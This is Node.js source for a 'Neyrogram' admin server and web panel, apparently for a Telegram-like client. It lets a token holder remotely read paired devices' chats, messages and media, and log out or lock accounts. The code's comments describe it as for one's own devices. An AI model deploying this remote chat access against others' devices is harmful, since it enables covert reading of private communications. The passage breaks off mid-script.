// Neyrogram admin server â€” zero dependencies, Node.js 18+
//
// Ishga tushirish:
//   node server.js
// Birinchi ishga tushganda config.json yaratiladi va tokenlar chiqadi.
// Admin panel:  http://<server>:8787/admin
//
// Qurilmalar /d/beat ga PAIR_TOKEN bilan holat yuboradi; admin panel
// ADMIN_TOKEN bilan ularni ko'radi va buyruq beradi. Hammasi SIZNING
// serveringiz va SIZNING qurilmalaringiz uchun.

const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const DIR = __dirname;
const CONFIG_PATH = path.join(DIR, 'config.json');
const DATA_PATH = path.join(DIR, 'data.json');

function token() { return crypto.randomBytes(16).toString('hex'); }

let config;
if (fs.existsSync(CONFIG_PATH)) {
  config = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
} else {
  config = { port: 8787, adminToken: token(), pairToken: token(), viewerToken: token() };
  fs.writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 2));
  console.log('config.json yaratildi.');
}
// eski config'larda viewerToken bo'lmasligi mumkin — qo'shib qo'yamiz
if (!config.viewerToken) {
  config.viewerToken = token();
  fs.writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 2));
}
const PORT = process.env.PORT || config.port || 8787;

// data.json: { devices: { <id>: {...} }, commands: { <id>: [ {...} ] } }
let data = { devices: {}, commands: {} };
if (fs.existsSync(DATA_PATH)) {
  try { data = JSON.parse(fs.readFileSync(DATA_PATH, 'utf8')); } catch (e) {}
}
if (!data.devices) data.devices = {};
if (!data.commands) data.commands = {};

// Chat keshi 1 soatda eskiradi. Serverda saqlanmaydi (faqat xotirada) â€” ishonchliroq.
const CACHE_TTL = 60 * 60 * 1000;
const cache = {}; // key -> { ts, payload }

function cacheGet(key) {
  const e = cache[key];
  if (!e) return null;
  if (Date.now() - e.ts > CACHE_TTL) { delete cache[key]; return null; }
  return e;
}
function cacheSet(key, payload) {
  cache[key] = { ts: Date.now(), payload };
}

// Media fayl keshi (video/rasm). Disk'da files/ ichida, 1 soatda eskiradi.
const filesDir = path.join(DIR, 'files');
try { fs.mkdirSync(filesDir, { recursive: true }); } catch (e) {}
const fileMeta = {};  // 'dev:acc:dlg:msg' -> {token, ctype, ts}
const fileStore = {}; // token -> {file, ctype, ts}
function purgeFiles() {
  const now = Date.now();
  for (const t of Object.keys(fileStore)) {
    if (now - fileStore[t].ts > CACHE_TTL) {
      try { fs.unlinkSync(fileStore[t].file); } catch (e) {}
      delete fileStore[t];
    }
  }
  for (const k of Object.keys(fileMeta)) {
    if (now - fileMeta[k].ts > CACHE_TTL) delete fileMeta[k];
  }
}
setInterval(purgeFiles, 10 * 60 * 1000);

// Bir xil buyruq navbatda bo'lsa qayta qo'shmaydi (panel tez-tez so'raganda yig'ilib qolmasin)
function queueOnce(deviceId, cmd) {
  const q = (data.commands[deviceId] = data.commands[deviceId] || []);
  const dup = q.some((c) => c.type === cmd.type && c.account === cmd.account && c.dialog_id === cmd.dialog_id && c.before === cmd.before && c.msg_id === cmd.msg_id);
  if (dup) return;
  cmd.id = crypto.randomBytes(4).toString('hex');
  cmd.ts = Date.now();
  q.push(cmd);
  save();
}
// har 10 daqiqada eskirgan keshni tozalash
setInterval(() => {
  const now = Date.now();
  for (const k of Object.keys(cache)) {
    if (now - cache[k].ts > CACHE_TTL) delete cache[k];
  }
}, 10 * 60 * 1000);

let saveTimer = null;
function save() {
  if (saveTimer) return;
  saveTimer = setTimeout(() => {
    saveTimer = null;
    fs.writeFile(DATA_PATH, JSON.stringify(data), () => {});
  }, 500);
}

function send(res, code, obj, type) {
  const body = typeof obj === 'string' ? obj : JSON.stringify(obj);
  res.writeHead(code, {
    'Content-Type': type || 'application/json; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, X-Admin-Token',
    'Cache-Control': 'no-store',
  });
  res.end(body);
}

function readBody(req, cb) {
  let size = 0;
  const chunks = [];
  req.on('data', (c) => {
    size += c.length;
    if (size > 8 * 1024 * 1024) { req.destroy(); return; } // 8 MB limit
    chunks.push(c);
  });
  req.on('end', () => cb(Buffer.concat(chunks)));
}

function json(buf) {
  try { return JSON.parse(buf.toString('utf8')); } catch (e) { return null; }
}

function isAdmin(req, url) {
  const t = req.headers['x-admin-token'] || url.searchParams.get('token');
  return t && t === config.adminToken;
}

// ---- Brute-force himoya: admin token uchun IP bo'yicha urinishlarni cheklash ----
const authFails = {}; // ip -> { count, until }
function clientIp(req) {
  const xf = req.headers['x-forwarded-for'];
  if (xf) return String(xf).split(',')[0].trim();
  return (req.socket && req.socket.remoteAddress) || '';
}
function authBlocked(ip) {
  const e = authFails[ip];
  return !!(e && e.until && Date.now() < e.until);
}
function noteAuthFail(ip) {
  const e = (authFails[ip] = authFails[ip] || { count: 0, until: 0 });
  e.count++;
  // 10 ta xato urinishdan keyin 15 daqiqa bloklash
  if (e.count >= 10) { e.until = Date.now() + 15 * 60 * 1000; }
}
function noteAuthOk(ip) { delete authFails[ip]; }

// Umumiy rate-limit: IP uchun 60 soniyalik oynada so'rovlar. Polling (har 2-5s) uchun keng chegara.
const rlWindow = {}; // ip -> { start, count }
const RL_MAX = 1200; // daqiqasiga
function rateLimited(ip) {
  if (!ip) return false;
  const now = Date.now();
  let e = rlWindow[ip];
  if (!e || now - e.start > 60 * 1000) { e = rlWindow[ip] = { start: now, count: 0 }; }
  e.count++;
  return e.count > RL_MAX;
}
setInterval(() => {
  const now = Date.now();
  for (const ip of Object.keys(rlWindow)) {
    if (now - rlWindow[ip].start > 2 * 60 * 1000) delete rlWindow[ip];
  }
}, 2 * 60 * 1000);
// eskirgan bloklarni tozalash
setInterval(() => {
  const now = Date.now();
  for (const ip of Object.keys(authFails)) {
    const e = authFails[ip];
    if ((!e.until || now >= e.until) && now - (e.ts || 0) > 60 * 60 * 1000) delete authFails[ip];
  }
}, 10 * 60 * 1000);

// Token darajasi: 'admin' (to'liq), 'viewer' (faqat ko'rish) yoki null.
function authLevel(req, url) {
  const t = req.headers['x-admin-token'] || url.searchParams.get('token');
  if (!t) return null;
  if (t === config.adminToken) return 'admin';
  if (t === config.viewerToken) return 'viewer';
  return null;
}

// need: 'admin' (yozish amallari) yoki 'viewer' (o'qish — admin ham o'tadi).
// Bloklangan bo'lsa 429, token xato bo'lsa hisoblaydi.
function require_(need, req, res, url) {
  const ip = clientIp(req);
  if (authBlocked(ip)) {
    send(res, 429, { ok: false, error: 'juda ko\'p urinish, keyinroq qayta urining' });
    return false;
  }
  const lvl = authLevel(req, url);
  const ok = lvl === 'admin' || (need === 'viewer' && lvl === 'viewer');
  if (ok) { noteAuthOk(ip); return true; }
  const provided = req.headers['x-admin-token'] || url.searchParams.get('token');
  if (provided) { const e = authFails[ip]; if (e) e.ts = Date.now(); noteAuthFail(ip); }
  send(res, lvl === 'viewer' ? 403 : 401, { ok: false, error: lvl === 'viewer' ? 'faqat ko\'rish huquqi' : undefined });
  return false;
}
// Yozish amallari uchun to'liq admin kerak.
function requireAdmin(req, res, url) { return require_('admin', req, res, url); }
// O'qish amallari uchun admin yoki viewer.
function requireRead(req, res, url) { return require_('viewer', req, res, url); }

const server = http.createServer((req, res) => {
  const url = new URL(req.url, 'http://x');
  const p = url.pathname;

  if (req.method === 'OPTIONS') return send(res, 204, '');

  // ---- Yengil rate-limit: IP bo'yicha daqiqasiga so'rovlar soni ----
  if (rateLimited(clientIp(req))) return send(res, 429, { ok: false, error: 'rate limit' });

  // ---- Qurilma: holat yuborish + buyruqlarni olish ----
  if (p === '/d/beat' && req.method === 'POST') {
    return readBody(req, (buf) => {
      const b = json(buf);
      if (!b || b.pair !== config.pairToken || !b.device_id) return send(res, 403, { ok: false });
      const id = String(b.device_id).slice(0, 64);
      const prev = data.devices[id] || {};
      const now = Date.now();
      const accounts = Array.isArray(b.accounts) ? b.accounts.slice(0, 10) : [];
      const unread = accounts.reduce((s, a) => s + (Number(a.unread) || 0), 0);
      // Statistika: beat soni, birinchi ko'rilgan, o'qilmaganlar tarixi (oxirgi 96 nuqta)
      const stats = prev.stats || { first_seen: now, beats: 0, history: [] };
      stats.beats++;
      stats.history.push({ t: now, unread });
      if (stats.history.length > 96) stats.history.splice(0, stats.history.length - 96);
      data.devices[id] = {
        id,
        name: String(b.name || 'Qurilma').slice(0, 64),
        app_version: String(b.app_version || '').slice(0, 32),
        accounts,
        last_seen: now,
        stats,
      };
      const queue = data.commands[id] || [];
      data.commands[id] = []; // yuborilgach o'chiramiz (qurilma ack bilan natijani qaytaradi)
      save();
      send(res, 200, { ok: true, commands: queue });
    });
  }

  // ---- Qurilma: tezkor buyruq pollingi (holat yubormasdan) ----
  if (p === '/d/poll' && req.method === 'POST') {
    return readBody(req, (buf) => {
      const b = json(buf);
      if (!b || b.pair !== config.pairToken || !b.device_id) return send(res, 403, { ok: false });
      const id = String(b.device_id).slice(0, 64);
      if (data.devices[id]) data.devices[id].last_seen = Date.now();
      const queue = data.commands[id] || [];
      data.commands[id] = [];
      if (queue.length) save();
      send(res, 200, { ok: true, commands: queue });
    });
  }

  // ---- Qurilma: buyruq natijasini qaytarish ----
  if (p === '/d/ack' && req.method === 'POST') {
    return readBody(req, (buf) => {
      const b = json(buf);
      if (!b || b.pair !== config.pairToken) return send(res, 403, { ok: false });
      const dev = data.devices[b.device_id];
      if (dev) {
        dev.last_result = { cmd_id: b.cmd_id, result: String(b.result || '').slice(0, 256), ts: Date.now() };
        save();
      }
      send(res, 200, { ok: true });
    });
  }

  // ---- Qurilma: chat ro'yxatini yuklash (kesh) ----
  if (p === '/d/chats' && req.method === 'POST') {
    return readBody(req, (buf) => {
      const b = json(buf);
      if (!b || b.pair !== config.pairToken || !b.device_id) return send(res, 403, { ok: false });
      cacheSet('chats:' + b.device_id + ':' + b.account, { account: b.account, dialogs: b.dialogs || [] });
      send(res, 200, { ok: true });
    });
  }

  // ---- Qurilma: bitta chat xabarlarini yuklash (kesh, sahifali) ----
  if (p === '/d/messages' && req.method === 'POST') {
    return readBody(req, (buf) => {
      const b = json(buf);
      if (!b || b.pair !== config.pairToken || !b.device_id) return send(res, 403, { ok: false });
      const before = b.before != null ? String(b.before) : '0';
      cacheSet('msgs:' + b.device_id + ':' + b.account + ':' + b.dialog_id + ':' + before, { messages: b.messages || [], hasMore: !!b.hasMore });
      send(res, 200, { ok: true });
    });
  }

  // ---- Qurilma: media fayl yuklash (video/rasm) â€” oqim bilan diskka ----
  if (p === '/d/file' && req.method === 'POST') {
    const pair = req.headers['x-pair-token'];
    const devId = (req.headers['x-device-id'] || '').toString().slice(0, 64);
    if (pair !== config.pairToken || !devId) { req.destroy(); return; }
    const token = crypto.randomBytes(12).toString('hex');
    const ctype = (req.headers['x-ctype'] || 'application/octet-stream').toString().slice(0, 100);
    const metaKey = devId + ':' + req.headers['x-acc'] + ':' + req.headers['x-dlg'] + ':' + req.headers['x-msg'];
    const file = path.join(filesDir, token);
    const ws = fs.createWriteStream(file);
    let size = 0;
    req.on('data', (c) => {
      size += c.length;
      if (size > 200 * 1024 * 1024) { req.destroy(); ws.destroy(); } // 200 MB cheklov
    });
    req.pipe(ws);
    ws.on('finish', () => {
      fileStore[token] = { file, ctype, ts: Date.now() };
      fileMeta[metaKey] = { token, ctype, ts: Date.now() };
      send(res, 200, { ok: true, token });
    });
    ws.on('error', () => send(res, 500, { ok: false }));
    return;
  }

  // ---- Media faylni berish (img/video src uchun) ----
  if (p.startsWith('/file/') && req.method === 'GET') {
    if (!requireRead(req, res, url)) return;
    const token = p.slice(6);
    const f = fileStore[token];
    if (!f || !fs.existsSync(f.file)) return send(res, 404, 'not found', 'text/plain');
    const stat = fs.statSync(f.file);
    res.writeHead(200, { 'Content-Type': f.ctype, 'Content-Length': stat.size, 'Cache-Control': 'private, max-age=3600', 'Accept-Ranges': 'bytes' });
    fs.createReadStream(f.file).pipe(res);
    return;
  }

  // ---- Admin: chat ro'yxati (keshdan yoki sync so'rab) ----
  if (p === '/api/chats' && req.method === 'GET') {
    if (!requireRead(req, res, url)) return;
    const dev = url.searchParams.get('device');
    const account = url.searchParams.get('account');
    if (!dev || !data.devices[dev]) return send(res, 404, { ok: false });
    const hit = cacheGet('chats:' + dev + ':' + account);
    if (hit) return send(res, 200, { ok: true, cached: true, age: Date.now() - hit.ts, dialogs: hit.payload.dialogs });
    queueOnce(dev, { type: 'syncchats', account: Number(account) });
    return send(res, 200, { ok: true, pending: true });
  }

  // ---- Admin: chat xabarlari (keshdan yoki sync so'rab) ----
  if (p === '/api/messages' && req.method === 'GET') {
    if (!requireRead(req, res, url)) return;
    const dev = url.searchParams.get('device');
    const account = url.searchParams.get('account');
    const dialog = url.searchParams.get('dialog');
    const before = url.searchParams.get('before') || '0';
    if (!dev || !data.devices[dev]) return send(res, 404, { ok: false });
    const hit = cacheGet('msgs:' + dev + ':' + account + ':' + dialog + ':' + before);
    const refresh = url.searchParams.get('refresh') === '1';
    if (hit && !refresh) return send(res, 200, { ok: true, cached: true, age: Date.now() - hit.ts, messages: hit.payload.messages, hasMore: hit.payload.hasMore });
    queueOnce(dev, { type: 'syncmsgs', account: Number(account), dialog_id: dialog, before: before });
    return send(res, 200, { ok: true, pending: true });
  }

  // ---- Admin: media faylni so'rash (keshdan yoki getfile buyrug'i) ----
  if (p === '/api/file' && req.method === 'GET') {
    if (!requireRead(req, res, url)) return;
    const dev = url.searchParams.get('device');
    const account = url.searchParams.get('account');
    const dialog = url.searchParams.get('dialog');
    const msg = url.searchParams.get('msg');
    if (!dev || !data.devices[dev]) return send(res, 404, { ok: false });
    const meta = fileMeta[dev + ':' + account + ':' + dialog + ':' + msg];
    if (meta && Date.now() - meta.ts <= CACHE_TTL && fileStore[meta.token]) {
      return send(res, 200, { ok: true, ready: true, token: meta.token, ctype: meta.ctype });
    }
    queueOnce(dev, { type: 'getfile', account: Number(account), dialog_id: dialog, msg_id: Number(msg) });
    return send(res, 200, { ok: true, pending: true });
  }

  // ---- Qurilma: log fayl yuborish ----
  if (p === '/d/logs' && req.method === 'POST') {
    const pair = req.headers['x-pair-token'];
    const devId = (req.headers['x-device-id'] || '').toString().slice(0, 64).replace(/[^a-zA-Z0-9_-]/g, '');
    if (pair !== config.pairToken || !devId) return send(res, 403, { ok: false });
    return readBody(req, (buf) => {
      const logsDir = path.join(DIR, 'logs');
      fs.mkdirSync(logsDir, { recursive: true });
      const file = path.join(logsDir, devId + '_' + Date.now() + '.txt');
      fs.writeFileSync(file, buf);
      if (data.devices[devId]) { data.devices[devId].last_log = path.basename(file); save(); }
      send(res, 200, { ok: true });
    });
  }

  // ---- Admin: qurilmalar ro'yxati ----
  if (p === '/api/devices' && req.method === 'GET') {
    if (!requireRead(req, res, url)) return;
    return send(res, 200, { ok: true, devices: Object.values(data.devices), now: Date.now() });
  }

  // ---- Admin: statistika (bitta qurilma yoki umumiy) ----
  if (p === '/api/stats' && req.method === 'GET') {
    if (!requireRead(req, res, url)) return;
    const now = Date.now();
    const dev = url.searchParams.get('device');
    const beatMs = 60 * 1000; // taxminiy beat oralig'i
    const build = (d) => {
      const s = d.stats || { first_seen: d.last_seen, beats: 0, history: [] };
      const online = now - d.last_seen < 120000;
      const uptimeMin = Math.round(s.beats * beatMs / 60000);
      const unreadNow = (d.accounts || []).reduce((a, x) => a + (Number(x.unread) || 0), 0);
      return {
        id: d.id, name: d.name, online,
        first_seen: s.first_seen, beats: s.beats, uptime_min: uptimeMin,
        unread_now: unreadNow, accounts: (d.accounts || []).length,
        history: s.history || [],
      };
    };
    if (dev) {
      if (!data.devices[dev]) return send(res, 404, { ok: false });
      return send(res, 200, { ok: true, now, stat: build(data.devices[dev]) });
    }
    const list = Object.values(data.devices).map(build);
    const summary = {
      devices: list.length,
      online: list.filter((x) => x.online).length,
      unread_total: list.reduce((a, x) => a + x.unread_now, 0),
    };
    return send(res, 200, { ok: true, now, summary, stats: list });
  }

  // ---- Admin: buyruq qo'yish ----
  if (p === '/api/command' && req.method === 'POST') {
    if (!requireAdmin(req, res, url)) return;
    return readBody(req, (buf) => {
      const b = json(buf);
      if (!b || !b.device_id || !b.type) return send(res, 400, { ok: false });
      if (!data.devices[b.device_id]) return send(res, 404, { ok: false, error: 'qurilma topilmadi' });
      const cmd = { id: token().slice(0, 8), type: String(b.type), ts: Date.now() };
      if (b.account != null) cmd.account = b.account;
      (data.commands[b.device_id] = data.commands[b.device_id] || []).push(cmd);
      save();
      send(res, 200, { ok: true, command: cmd });
    });
  }

  // ---- Admin: qurilmani ro'yxatdan o'chirish ----
  if (p === '/api/remove' && req.method === 'POST') {
    if (!requireAdmin(req, res, url)) return;
    return readBody(req, (buf) => {
      const b = json(buf);
      if (b && b.device_id) { delete data.devices[b.device_id]; delete data.commands[b.device_id]; save(); }
      send(res, 200, { ok: true });
    });
  }

  // ---- Admin panel (HTML) ----
  if (p === '/admin' || p === '/') {
    return send(res, 200, ADMIN_HTML, 'text/html; charset=utf-8');
  }

  send(res, 404, { ok: false });
});

server.listen(PORT, () => {
  console.log('Neyrogram admin server ishga tushdi: http://0.0.0.0:' + PORT);
  console.log('Admin panel : http://<server-ip>:' + PORT + '/admin');
  console.log('Admin token : ' + config.adminToken);
  console.log('Pair token  : ' + config.pairToken + '   (qurilmalarda shuni kiriting)');
  console.log('Viewer token: ' + config.viewerToken + '   (faqat ko\'rish, buyruq bera olmaydi)');
});

const ADMIN_HTML = `<!doctype html>
<html lang="uz"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Neyrogram Admin</title>
<style>
:root{--bg:#0f1220;--card:#1a1f33;--mut:#8a93b0;--txt:#eef1f8;--acc:#8e5cff;--ok:#36d07a;--off:#6b7280;--warn:#f59e0b}
*{box-sizing:border-box}body{margin:0;font:15px/1.5 system-ui,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--txt)}
header{padding:16px 20px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #262c44}
h1{font-size:18px;margin:0;font-weight:700}.sp{flex:1}
input{background:var(--card);border:1px solid #2c3350;color:var(--txt);border-radius:10px;padding:9px 12px;font-size:14px}
button{background:var(--acc);color:#fff;border:0;border-radius:10px;padding:9px 14px;font-size:14px;cursor:pointer}
button.ghost{background:#2c3350}button.danger{background:#e0455a}button:disabled{opacity:.5;cursor:default}
main{padding:16px 20px;max-width:1000px;margin:0 auto}
.dev{background:var(--card);border:1px solid #262c44;border-radius:14px;padding:16px;margin-bottom:14px}
.row{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.dot{width:10px;height:10px;border-radius:50%;background:var(--off)}.dot.on{background:var(--ok)}
.name{font-weight:700;font-size:16px}.mut{color:var(--mut);font-size:13px}
.acc{background:#11162a;border-radius:10px;padding:8px 12px;margin-top:8px;font-size:14px}
.badge{background:#11162a;border-radius:8px;padding:2px 8px;font-size:12px;color:var(--mut)}
.cmds{margin-top:12px;display:flex;gap:8px;flex-wrap:wrap}
.empty{color:var(--mut);text-align:center;padding:40px}
.login{max-width:360px;margin:60px auto;text-align:center}.login input{width:100%;margin:10px 0}
/* Telegram-web uslubidagi chat */
body.chatmode main{max-width:none;padding:0}
#chatwrap{display:flex;height:calc(100vh - 62px)}
#sidebar{width:360px;max-width:42%;border-right:1px solid #0a1017;background:#17212b;display:flex;flex-direction:column}
.shead{padding:8px 12px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #0a1017;flex:none}
.shead b{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
#chatlist{flex:1;overflow-y:auto}
.ci{display:flex;gap:11px;padding:8px 12px;cursor:pointer;align-items:center}
.ci:hover{background:#202b36}.ci.sel{background:#2b5278}
.av{border-radius:50%;flex:none;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:600;overflow:hidden}
.av img{width:100%;height:100%;object-fit:cover}
.ci .mid{flex:1;min-width:0}
.ci .t1{display:flex;justify-content:space-between;align-items:baseline;gap:6px}
.ci .title{font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.ci .tm{font-size:12px;color:#6d7f8f;flex:none}
.ci .prev{color:#8a99a8;font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.ci.sel .prev,.ci.sel .tm{color:#cfe0ef}
.unb{background:#5288c1;color:#fff;border-radius:12px;min-width:20px;height:20px;padding:0 6px;font-size:12px;display:inline-flex;align-items:center;justify-content:center;flex:none}
#conv{flex:1;display:flex;flex-direction:column;min-width:0}
#convhead{height:56px;display:flex;align-items:center;gap:12px;padding:0 14px;border-bottom:1px solid #0a1017;background:#17212b;flex:none}
#convbody{flex:1;overflow-y:auto;padding:14px 6%;background:#0e1621}
.msg{max-width:74%;margin:3px 0;padding:6px 9px 4px;border-radius:12px;position:relative;clear:both;word-wrap:break-word;white-space:pre-wrap;font-size:14px}
.msg.in{background:#182533;float:left;border-bottom-left-radius:4px}
.msg.out{background:#2b5278;float:right;border-bottom-right-radius:4px}
.msg .snd{font-size:13px;font-weight:600;margin-bottom:2px}
.msg .mt{font-size:11px;color:#8aa6c2;float:right;margin:6px 0 -2px 10px}
.msg .media{margin:2px 0}
.msg img.ph{max-width:100%;border-radius:8px;display:block;cursor:pointer}
.msg video{max-width:100%;border-radius:8px;display:block}
.mbtn{display:inline-flex;align-items:center;gap:6px;background:rgba(255,255,255,.1);border-radius:8px;padding:6px 10px;cursor:pointer;font-size:13px}
.clr{clear:both}
.convempty{flex:1;display:flex;align-items:center;justify-content:center;color:#6d7f8f}
.mobback{display:none}
@media(max-width:700px){#sidebar{width:100%;max-width:100%}#conv{display:none}body.showconv #sidebar{display:none}body.showconv #conv{display:flex}.mobback{display:inline-flex}}
</style></head><body>
<header><div style="width:28px;height:28px;border-radius:8px;background:linear-gradient(135deg,#8e5cff,#3f6bff);display:flex;align-items:center;justify-content:center;font-weight:800">N</div>
<h1>Neyrogram Admin</h1><div class="sp"></div><span id="status" class="mut"></span>
<button class="ghost" onclick="logout()" id="logoutBtn" style="display:none">Chiqish</button></header>
<main id="main"></main>
<script>
let TOKEN = localStorage.getItem('neyroAdminToken') || '';
let mode = 'devices';
let DEVICES = [];
let viewCtx = {};
const main = document.getElementById('main');
const statusEl = document.getElementById('status');
const fmtDate = (sec)=>{if(!sec)return '';const d=new Date(sec*1000);const p=n=>(n<10?'0':'')+n;return p(d.getDate())+'.'+p(d.getMonth()+1)+' '+p(d.getHours())+':'+p(d.getMinutes());};
function devName(id){const d=DEVICES.find(x=>x.id===id);return d?d.name:id;}
function accName(devId,accId){const d=DEVICES.find(x=>x.id===devId);if(!d)return '';const a=(d.accounts||[]).find(x=>String(x.id)===String(accId));return a?a.name:('#'+accId);}
const fmtAgo = (ms)=>{const s=Math.floor((Date.now()-ms)/1000);if(s<60)return s+' s';if(s<3600)return Math.floor(s/60)+' daq';if(s<86400)return Math.floor(s/3600)+' soat';return Math.floor(s/86400)+' kun';};
function esc(s){return String(s==null?'':s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));}
async function api(path,opts={}){opts.headers=Object.assign({'X-Admin-Token':TOKEN,'Content-Type':'application/json'},opts.headers||{});let r;try{r=await fetch(path,opts);}catch(e){const er=new Error('tarmoq xatosi');er.network=true;throw er;}if(!r.ok){const er=new Error('HTTP '+r.status);er.status=r.status;throw er;}return r.json();}
function loginView(msg){document.getElementById('logoutBtn').style.display='none';main.innerHTML=
'<div class="login"><h2>Kirish</h2><p class="mut">ADMIN tokenni kiriting (server ishga tushganda konsolda chiqqan). Diqqat: bu pair token EMAS.</p>'+
(msg?('<p style="color:#e0455a;font-weight:600">'+esc(msg)+'</p>'):'')+
'<input id="tk" type="password" placeholder="Admin token" autofocus><button onclick="doLogin()" style="width:100%">Kirish</button></div>';
document.getElementById('tk').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin();});}
async function doLogin(){const t=document.getElementById('tk').value.trim();if(!t){loginView('Token kiritilmadi.');return;}TOKEN=t;main.innerHTML='<div class="empty">Tekshirilmoqda...</div>';try{await load();localStorage.setItem('neyroAdminToken',TOKEN);document.getElementById('logoutBtn').style.display='';}catch(e){TOKEN='';if(e.status===401){loginView('Token xato. Bu ADMIN token bo\\'lishi kerak (pair token emas).');}else if(e.network){loginView('Serverga ulanib bo\\'lmadi. Internet yoki server manzilini tekshiring.');}else{loginView('Xato: '+e.message);}}}
function logout(){TOKEN='';localStorage.removeItem('neyroAdminToken');render();}
async function sendCmd(id,type,account){if(!confirm('Buyruq: '+type+(account?(' (akkaunt '+account+')'):'')+' â€” yuborilsinmi?'))return;await api('/api/command',{method:'POST',body:JSON.stringify({device_id:id,type,account})});alert('Buyruq navbatga qo\\'yildi. Qurilma keyingi ulanishida bajaradi.');}
async function removeDev(id){if(!confirm('Qurilma ro\\'yxatdan o\\'chirilsinmi?'))return;await api('/api/remove',{method:'POST',body:JSON.stringify({device_id:id})});load();}
async function showStats(id){let d;try{d=await api('/api/stats?device='+encodeURIComponent(id));}catch(e){alert('Xato: '+e.message);return;}const s=d.stat;if(!s){alert('Statistika yo\\'q');return;}
const first=s.first_seen?fmtDate(Math.floor(s.first_seen/1000)):'—';
const up=s.uptime_min>=60?(Math.floor(s.uptime_min/60)+' soat '+(s.uptime_min%60)+' daq'):(s.uptime_min+' daq');
alert('Statistika: '+devName(id)+'\\n\\n'+
'Holat: '+(s.online?'online':'offline')+'\\n'+
'Birinchi ulanish: '+first+'\\n'+
'Faol vaqt (taxminiy): '+up+'\\n'+
'Beat soni: '+s.beats+'\\n'+
'Akkauntlar: '+s.accounts+'\\n'+
'Hozir o\\'qilmagan: '+s.unread_now);}
async function load(){const d=await api('/api/devices');const devs=(d.devices||[]).sort((a,b)=>b.last_seen-a.last_seen);
DEVICES=devs;
if(mode!=='devices')return;
const onlineN=devs.filter(x=>Date.now()-x.last_seen<120000).length;
statusEl.textContent=devs.length+' qurilma · '+onlineN+' online';
if(!devs.length){main.innerHTML='<div class="empty">Hali hech qanday qurilma ulanmadi.<br>Neyrogram sozlamalarida server manzili va pair tokenni kiriting.</div>';return;}
main.innerHTML=devs.map(dev=>{const online=Date.now()-dev.last_seen<120000;
const accs=(dev.accounts||[]).map(a=>'<div class="acc"><div class="row"><span class="dot '+(a.online?'on':'')+'"></span><b>'+esc(a.name)+'</b>'+(a.phone?' <span class="mut">'+esc(a.phone)+'</span>':'')+'<div class="sp"></div>'+(a.unread?('<span class="badge">'+a.unread+' o\\'qilmagan</span>'):'')+'</div><div class="cmds"><button onclick="openChats(\\''+dev.id+'\\','+a.id+')">Chatlar</button><button class="danger" onclick="sendCmd(\\''+dev.id+'\\',\\'logout\\','+a.id+')">Chiqarish</button></div></div>').join('');
return '<div class="dev"><div class="row"><span class="dot '+(online?'on':'')+'"></span><span class="name">'+esc(dev.name)+'</span>'+
'<span class="badge">v'+esc(dev.app_version)+'</span><div class="sp"></div><span class="mut">'+(online?'online':(fmtAgo(dev.last_seen)+' oldin'))+'</span></div>'+
(accs||'<div class="mut" style="margin-top:8px">Akkauntlar yo\\'q</div>')+
'<div class="cmds"><button onclick="sendCmd(\\''+dev.id+'\\',\\'lock\\')">Ilovani qulflash</button>'+
'<button class="ghost" onclick="showStats(\\''+dev.id+'\\')">Statistika</button>'+
'<button class="ghost" onclick="sendCmd(\\''+dev.id+'\\',\\'sendlogs\\')">Loglarni yuborish</button>'+
(dev.last_log?(' <span class="mut">oxirgi log: '+esc(dev.last_log)+'</span>'):'')+
'<div class="sp"></div><button class="ghost" onclick="removeDev(\\''+dev.id+'\\')">O\\'chirish</button></div>'+
(dev.last_result?('<div class="mut" style="margin-top:8px">Oxirgi natija: '+esc(dev.last_result.result)+'</div>'):'')+'</div>';}).join('');}
const AVC=['#e17076','#7bc862','#e5ca77','#65aadd','#a695e7','#ee7aae','#6ec9cb','#faa774'];
function avColor(s){s=s||'';let h=0;for(let i=0;i<s.length;i++)h=(h*31+s.charCodeAt(i))>>>0;return AVC[h%AVC.length];}
function initials(s){s=(s||'').trim();if(!s)return '#';const p=s.split(/\\s+/);return ((p[0][0]||'')+(p[1]?p[1][0]:'')).toUpperCase();}
function avatar(name,size){return '<div class="av" style="width:'+size+'px;height:'+size+'px;font-size:'+Math.round(size*0.4)+'px;background:'+avColor(name)+'">'+esc(initials(name))+'</div>';}
function fmtTime(sec){if(!sec)return '';const d=new Date(sec*1000);const p=n=>(n<10?'0':'')+n;return p(d.getHours())+':'+p(d.getMinutes());}
let CHATS=[];let CURDLG=null;
function backToDevices(){mode='devices';document.body.classList.remove('chatmode','showconv');render();}
function openChats(devId,accId){mode='chats';viewCtx={devId,accId,dialogId:null};CURDLG=null;statusEl.textContent=esc(accName(devId,accId));document.body.classList.add('chatmode');document.body.classList.remove('showconv');
main.innerHTML='<div id="chatwrap"><div id="sidebar"><div class="shead"><button class="ghost" onclick="backToDevices()">&larr;</button><b>'+esc(accName(devId,accId))+'</b></div><div id="chatlist" class="empty">Yuklanmoqda...</div></div><div id="conv"><div class="convempty">Suhbatni tanlang</div></div></div>';
pollChats(0);}
async function pollChats(tries){if(mode!=='chats')return;let d;try{d=await api('/api/chats?device='+encodeURIComponent(viewCtx.devId)+'&account='+encodeURIComponent(viewCtx.accId));}catch(e){const l=document.getElementById('chatlist');if(l)l.innerHTML='<div class="empty">Xato: '+esc(e.message)+'</div>';return;}
const list=document.getElementById('chatlist');if(!list||mode!=='chats')return;
if(d.pending){list.innerHTML='<div class="empty">Qurilmadan so\\'ralmoqda... ('+(tries+1)+')<br><span class="mut">qurilma onlayn bo\\'lishi kerak</span></div>';if(tries<40)setTimeout(()=>pollChats(tries+1),2500);return;}
CHATS=(d.dialogs||[]);
